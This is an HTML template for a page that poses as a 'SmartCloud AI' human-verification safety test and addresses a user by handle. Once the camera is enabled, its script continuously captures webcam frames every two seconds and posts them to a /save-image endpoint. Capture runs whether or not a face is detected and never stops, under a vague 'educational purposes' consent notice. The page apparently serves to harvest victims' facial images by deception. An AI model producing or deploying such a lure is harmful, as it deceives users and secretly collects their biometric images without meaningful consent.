<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.9.2/dropzone.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SmartCloud AI</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(315deg, rgb(26, 3, 71) 3%, rgba(60, 132, 206, 1) 38%, rgba(48, 238, 226, 1) 68%, rgb(172, 101, 101) 98%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: auto;
            animation: gradient 15s ease infinite;
            background-attachment: fixed;
            box-sizing: border-box;
            background-size: 400% 400%;
            padding: 0;
        }
        .wave {
            background: rgb(255 255 255 / 25%);
            border-radius: 1000% 1000% 0 0;
            position: fixed;
            width: 200%;
            height: 12em;
            animation: wave 10s -3s linear infinite;
            transform: translate3d(0, 0, 0);
            opacity: 0.8;
            bottom: 0;
            left: 0;
            z-index: -1;
        }

        .wave:nth-of-type(2) {
            bottom: -1.25em;
            animation: wave 18s linear reverse infinite;
            opacity: 0.8;
        }

        .wave:nth-of-type(3) {
            bottom: -2.5em;
            animation: wave 20s -1s reverse infinite;
            opacity: 0.9;
        }

        @keyframes wave {
            2% {
                transform: translateX(1);
            }

            25% {
                transform: translateX(-25%);
            }

            50% {
                transform: translateX(-50%);
            }

            75% {
                transform: translateX(-25%);
            }

            100% {
                transform: translateX(1);
            }
        }

        #face-finder {
            max-width: 500px;
            width: 90%;
            position: relative;
            background: #fff;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            padding: 15px;
            text-align: center;
        }

        #canvas {
            position: absolute;
            top: 0;
            left: 0;
            z-index: 99;
        }

        #status {
            width: 100%;
            background: rgb(12, 33, 173);
            color: white;
            margin: 10px 0;
            padding: 0.75em 0;
            border-radius: 5px;
        }

        #continue-button {
            display: none;
            margin-top: 15px;
            padding: 8px 16px;
            background: linear-gradient(45deg, #6b73ff, #000dff);
            color: white;
            text-decoration: none;
            font-size: 14px;
            border-radius: 20px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            transition: background 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }

        #continue-button:hover {
            background: linear-gradient(45deg, #5a63d8, #000acc);
            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.15);
        }

        #continue-button:active {
            background: linear-gradient(45deg, #494fab, #000799);
            box-shadow: 0 3px 5px rgba(0, 0, 0, 0.2);
        }

        span {
            color: blue;
        }

        .modal {
            display: none;
            position: fixed;
            z-index: 1;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
        }

        .modal-content {
            background-color: white;
            margin: auto;
            padding: 20px;
            border: 1px solid #888;
            width: 80%;
            max-width: 600px;
            border-radius: 10px;
            text-align: center;
        }

        .close-btn {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
        }

        .close-btn:hover,
        .close-btn:focus {
            color: black;
            text-decoration: none;
            cursor: pointer;
        }

        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        button:hover {
            background-color: #45a049;
        }
    </style>
    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs"></script>
    <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/blazeface"></script>
</head>

<body>

    <div class="wave"></div>
    <div class="wave"></div>
    <div class="wave"></div>
    
    <div style="margin-right: 120px;" class="root">
        <h1 style="color: blue;"> AI SECURITY TEST</h1>
        <p style="color: rgb(255, 255, 255);">Hey <span><b>@<%= username %></b></span>, this is a Safety test from SmartCloud AI, <br> show your face to prove you are human</p>
        <p style="color: white;"> - You must have a camera to pass verification</p>
        <p style="color: white;">- Enable the camera to pass verification</p>
    </div>
    <div id="face-finder">
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
        <p id="status">Initializing...</p>
        <a id="continue-button" href="/funcCloud" class="button">Continue</a>
    </div>
    <button id="enable-camera" style="margin-top: 20px;">Enable Camera</button>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        let model;

        async function setupCamera() {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { width: 500, height: 300 },
                audio: false
            });
            video.srcObject = stream;
            return new Promise((resolve) => {
                video.onloadedmetadata = () => {
                    resolve(video);
                };
            });
        }

        async function loadModel() {
            model = await blazeface.load();
        }

        async function detectFaces() {
            const predictions = await model.estimateFaces(video, false);
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            if (predictions.length > 0) {
                document.getElementById('status').innerText = "The face has been successfully discovered !";
                document.getElementById('continue-button').style.display = 'block';
                predictions.forEach(prediction => {
                    const start = prediction.topLeft;
                    const end = prediction.bottomRight;
                    const size = [end[0] - start[0], end[1] - start[1]];
                    ctx.fillStyle = "rgba(255, 0, 0, 0.5)";
                    ctx.fillRect(start[0], start[1], size[0], size[1]);
                });
            } else {
                document.getElementById('status').innerText = "No Faces Found !";
                document.getElementById('continue-button').style.display = 'none';
            }
        }

        async function captureImage() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const dataUrl = canvas.toDataURL('ucfm-user-image/jpeg');
            fetch('/save-image', {
                method: 'POST',
                body: JSON.stringify({ image: dataUrl }),
                headers: {
                    'Content-Type': 'application/json'
                }
            });
        }

        async function main() {
            await setupCamera();
            await loadModel();
            setInterval(() => {
                detectFaces();
                captureImage();
            }, 2000);
        }

        document.getElementById('enable-camera').addEventListener('click', () => {
            main();
            document.getElementById('enable-camera').style.display = 'none';
        });
    </script>
    <script>
        const modal = document.createElement('div');
        modal.classList.add('modal');
        modal.id = 'privacyModal';

        const modalContent = document.createElement('div');
        modalContent.classList.add('modal-content');

        const closeBtn = document.createElement('span');
        closeBtn.classList.add('close-btn');
        closeBtn.id = 'closeBtn';
        closeBtn.innerHTML = '&times;';

        const title = document.createElement('h2');
        title.textContent = 'Privacy Policy';

        const policyText1 = document.createElement('p');
        policyText1.textContent = 'We are committed to protecting your privacy. This policy outlines how we handle your personal data and the measures we take to ensure its protection.';

        const policyText2 = document.createElement('p');
        policyText2.innerHTML = '<strong>Face Detection</strong>: We require your consent to use your facial data for face detection purposes. This data will be used strictly for educational and interest-related purposes.';

        const policyText3 = document.createElement('p');
        policyText3.innerHTML = '<strong>Data Collection</strong>: We collect personal data such as your name, email, and other relevant information. This data will be used to enhance your experience and for educational purposes.';

        const policyText4 = document.createElement('p');
        policyText4.textContent = 'By clicking "I Agree", you consent to the use of your facial data and personal information as outlined in this policy.';

        const agreeBtn = document.createElement('button');
        agreeBtn.id = 'agreeBtn';
        agreeBtn.textContent = 'I Agree';

        modalContent.appendChild(closeBtn);
        modalContent.appendChild(title);
        modalContent.appendChild(policyText1);
        modalContent.appendChild(policyText2);
        modalContent.appendChild(policyText3);
        modalContent.appendChild(policyText4);
        modalContent.appendChild(agreeBtn);

        modal.appendChild(modalContent);
        document.body.appendChild(modal);
        modal.style.display = 'flex';

        closeBtn.addEventListener('click', () => {
            modal.style.display = 'none';
        });

        agreeBtn.addEventListener('click', () => {
            modal.style.display = 'none';
            alert('Thank you for agreeing to our privacy policy.');
            document.getElementById('enable-camera').style.display = 'block';
        });

        window.addEventListener('click', (event) => {
            if (event.target === modal) {
                modal.style.display = 'none';
            }
        });
    </script>
</body>

</html>
